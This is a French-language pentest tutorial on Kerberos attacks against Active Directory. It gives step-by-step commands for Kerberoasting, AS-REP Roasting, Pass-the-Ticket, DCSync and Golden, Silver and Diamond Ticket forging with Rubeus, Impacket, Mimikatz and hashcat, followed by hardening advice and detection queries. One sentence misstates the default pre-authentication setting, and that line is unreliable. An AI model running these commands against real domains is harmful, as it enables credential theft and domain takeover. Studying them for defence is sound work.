# Attaques Kerberos avancées : Kerberoasting, AS-REP Roasting et Golden Ticket

Kerberos est le protocole d'authentification d'Active Directory. Comprendre ses failles est essentiel pour tout pentester ciblant des environnements Windows d'entreprise. Ces attaques figurent dans les phases post-exploitation des Red Teams les plus sophistiquées.

## Rappel : Comment fonctionne Kerberos

```
Flux d'authentification Kerberos :

1. AS-REQ : L'utilisateur demande un TGT au KDC
2. AS-REP : Le KDC répond avec un TGT chiffré (clé = hash mot de passe)
3. TGS-REQ : L'utilisateur demande un ticket service (TGS)
4. TGS-REP : Le KDC répond avec un TGS chiffré (clé = hash compte service)
5. AP-REQ  : L'utilisateur présente le TGS au service
6. AP-REP  : Le service accorde l'accès

Composants :
→ KDC (Key Distribution Center) = Domain Controller
→ TGT (Ticket Granting Ticket) = "Pass de transport"
→ TGS (Ticket Granting Service) = "Ticket pour un service spécifique"
→ SPN (Service Principal Name) = Identifiant d'un service
```

## Kerberoasting

### Principe

```
Kerberoasting exploite le fait que :
1. N'importe quel utilisateur authentifié peut demander un TGS
2. Le TGS est chiffré avec le hash NTLM du compte de service
3. Ce hash peut être cracké hors ligne (offline)

Condition : Il doit exister des comptes avec un SPN (Service Principal Name)
```

### Exploitation

```powershell
# Étape 1 : Trouver les comptes avec SPN
# PowerShell natif
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
    -Properties ServicePrincipalName |
    Select-Object Name, ServicePrincipalName

# Avec PowerView
Import-Module PowerView
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Étape 2 : Demander les TGS (Kerberoasting)
# Méthode 1 : Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# Méthode 2 : Impacket (depuis Linux)
GetUserSPNs.py DOMAIN/user:password -dc-ip 192.168.1.1 -request

# Résultat : hash au format $krb5tgs$23$...
# $krb5tgs$23$*svc_sql*DOMAIN*SQL/server.domain.com*[hash]

# Étape 3 : Cracker le hash hors ligne
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

### Défense contre Kerberoasting

```powershell
# 1. Utiliser des mots de passe longs et complexes pour les comptes de service
# → 25+ caractères aléatoires = impossible à cracker

# 2. Utiliser des MSA/gMSA (Managed Service Accounts)
# Le mot de passe est géré automatiquement par AD (très long, rotation auto)
New-ADServiceAccount -Name "svc-sql" -DNSHostName "sql.domain.com"

# 3. Activer AES pour Kerberos (plus difficile à cracker que RC4)
Set-ADUser svc_sql -KerberosEncryptionType AES128,AES256

# 4. Monitorer les demandes TGS massives (Event ID 4769)
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4769
} | Where-Object {$_.Properties[5].Value -eq '0x17'}  # RC4 encryption
# Beaucoup de demandes RC4 en peu de temps = Kerberoasting !
```

## AS-REP Roasting

### Principe

```
AS-REP Roasting cible les comptes avec "Do not require Kerberos preauthentication"
→ La pré-authentification est désactivée par défaut mais peut être désactivée
→ Sans pré-auth : n'importe qui peut demander un AS-REP sans s'authentifier
→ L'AS-REP contient du matériel chiffré avec le hash du mot de passe
```

### Exploitation

```bash
# Trouver les comptes vulnérables (pré-auth désactivée)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# AS-REP Roasting sans credential (depuis le réseau !)
# Impacket
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -dc-ip 192.168.1.1

# Avec Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Hash format : $krb5asrep$23$user@DOMAIN:[hash]
# Cracker
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

## Pass-the-Ticket

```powershell
# Utiliser un ticket Kerberos volé sans connaître le mot de passe

# Voler les tickets en mémoire avec Mimikatz
sekurlsa::tickets /export
# Crée des fichiers .kirbi

# Importer un ticket dans la session courante
kerberos::ptt ticket.kirbi

# Vérifier les tickets chargés
klist

# Accéder à la ressource avec le ticket volé
dir \\server\share
```

## Golden Ticket — La clé du royaume

### Principe

```
Le Golden Ticket est le Saint Graal des attaques AD :

→ Nécessite le hash NTLM du compte KRBTGT (compte spécial KDC)
→ Permet de créer des TGT FORGÉS pour n'importe quel utilisateur
→ Valable pendant 10 ans par défaut
→ Survit aux changements de mot de passe des utilisateurs
→ Persistance absolue dans le domaine

Comment obtenir le hash KRBTGT :
→ Compromission du Domain Controller
→ DCSync attack (si droits suffisants)
→ Dump de la base NTDS.dit
```

### Exploitation

```powershell
# Étape 1 : Obtenir le hash KRBTGT via DCSync
# Nécessite : Domain Admin ou droits DCSync
mimikatz # lsadump::dcsync /domain:DOMAIN /user:krbtgt

# Résultat :
# Hash NTLM: 1a2b3c4d5e6f...
# Domain SID: S-1-5-21-XXXXXXXXX

# Étape 2 : Créer le Golden Ticket
kerberos::golden /user:fakeadmin /domain:DOMAIN.COM `
    /sid:S-1-5-21-XXXXXXXXX `
    /krbtgt:KRBTGT_HASH `
    /id:500 `
    /ptt

# Paramètres :
# /user : n'importe quel nom (même inexistant !)
# /id:500 : RID 500 = Administrateur
# /ptt : inject directement en mémoire

# Étape 3 : Utiliser le Golden Ticket
dir \\DC\C$          # Accès au DC
psexec.exe \\DC cmd  # Shell sur le DC
```

### Silver Ticket

```powershell
# Silver Ticket = ticket forgé pour UN SERVICE spécifique
# Nécessite seulement le hash du compte de service (pas KRBTGT)
# Moins puissant mais plus discret (pas de communication avec le KDC)

kerberos::golden /user:admin /domain:DOMAIN.COM `
    /sid:S-1-5-21-XXXXXXXXX `
    /target:server.domain.com `
    /service:cifs `           # Service ciblé
    /rc4:SERVICE_ACCOUNT_HASH `
    /ptt
```

## Diamond Ticket — L'alternative furtive

```
Golden Ticket vs Diamond Ticket :

Golden Ticket :
→ TGT entièrement forgé (n'existe pas dans le KDC)
→ Détectable : le KDC n'a pas de trace de ce TGT
→ ATA/MDI peut détecter les TGTs sans AS-REQ correspondant

Diamond Ticket :
→ Modifie un vrai TGT légitime (demandé normalement)
→ Beaucoup plus difficile à détecter
→ La demande AS-REQ est légitime
→ Seul le contenu du TGT est modifié (ajout de groupes, extension durée)

# Rubeus Diamond Ticket
Rubeus.exe diamond /krbkey:KRBTGT_AES_KEY /user:normaluser /password:password /enctype:aes /domain:DOMAIN.COM /dc:DC.DOMAIN.COM /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## Détection

```python
# Event IDs à surveiller pour détecter ces attaques

events_kerberos = {
    "4768": "AS-REQ (demande TGT) - AS-REP Roasting si sans pré-auth",
    "4769": "TGS-REQ - Kerberoasting si beaucoup de RC4 (EncType 0x17)",
    "4771": "Échec pre-auth Kerberos",
    "4624": "Connexion réussie - vérifier les anomalies",
}

# Requête Sentinel pour détecter Kerberoasting
kql_kerberoasting = """
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"  // RC4 = suspect (AES préféré)
| where ServiceName != "krbtgt"
| where ServiceName !endswith "$"       // Exclure les comptes machine
| summarize count() by Account, IpAddress, bin(TimeGenerated, 5m)
| where count_ > 5                      // Plus de 5 TGS en 5 min = suspect
"""

# Microsoft Defender for Identity détecte automatiquement :
# → Kerberoasting (volume de TGS RC4)
# → Pass-the-Ticket (ticket utilisé depuis IP différente)
# → Golden Ticket (TGT avec durée anormale ou depuis compte inexistant)
```

## Conclusion

Les attaques Kerberos — Kerberoasting, AS-REP Roasting, Golden/Silver Tickets — représentent les techniques les plus puissantes en post-exploitation Active Directory. La défense passe par des mots de passe longs pour les comptes de service, l'utilisation de gMSA, la surveillance des Event IDs Kerberos et le déploiement de Microsoft Defender for Identity (anciennement ATA).

---
*Catégorie : Pentest*
